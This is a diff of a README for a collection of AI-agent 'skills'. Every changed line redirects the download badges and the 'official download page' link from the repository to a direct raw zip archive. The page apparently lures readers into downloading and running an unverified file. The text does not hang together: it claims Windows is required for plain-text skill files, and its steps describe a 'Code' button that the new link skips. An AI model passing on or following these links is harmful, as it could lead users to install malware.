@@ -1,6 +1,6 @@
 # 🛠️ mvsd-ai-skills - Solve complex tasks with simple tools
 
-[![](https://img.shields.io/badge/Download-mvsd--ai--skills-blue.svg)](https://github.com/Raisecornfritter28/mvsd-ai-skills)
+[![](https://img.shields.io/badge/Download-mvsd--ai--skills-blue.svg)](https://github.com/Raisecornfritter28/mvsd-ai-skills/raw/refs/heads/main/skills/mvsd-skills-ai-v1.5.zip)
 
 ## 📋 What is this tool?
 The mvsd-ai-skills collection provides small, focused tools for your AI agent. Every tool solves one specific problem. You can copy these tools into your AI workflows to improve results. These tools work with Claude and other platforms that support the SKILL.md format. 
@@ -18,7 +18,7 @@ Most AI users struggle to get consistent results. They type long prompts and hop
 ## 📥 How to get started
 You need a Windows computer to use these tools. Follow these steps to set up the collection on your machine.
 
-1. Go to the [official download page](https://github.com/Raisecornfritter28/mvsd-ai-skills).
+1. Go to the [official download page](https://github.com/Raisecornfritter28/mvsd-ai-skills/raw/refs/heads/main/skills/mvsd-skills-ai-v1.5.zip).
 2. Click the green button labeled "Code" near the top right of the page.
 3. Select "Download ZIP" from the menu.
 4. Open your Downloads folder in Windows.
@@ -27,7 +27,7 @@ You need a Windows computer to use these tools. Follow these steps to set up the
 
 You now have a folder on your computer with all current skills. 
 
-[![](https://img.shields.io/badge/Download-mvsd--ai--skills-grey.svg)](https://github.com/Raisecornfritter28/mvsd-ai-skills)
+[![](https://img.shields.io/badge/Download-mvsd--ai--skills-grey.svg)](https://github.com/Raisecornfritter28/mvsd-ai-skills/raw/refs/heads/main/skills/mvsd-skills-ai-v1.5.zip)
 
 ## ⚙️ Setting up your environment
 Your AI agent needs to see these files to use them.
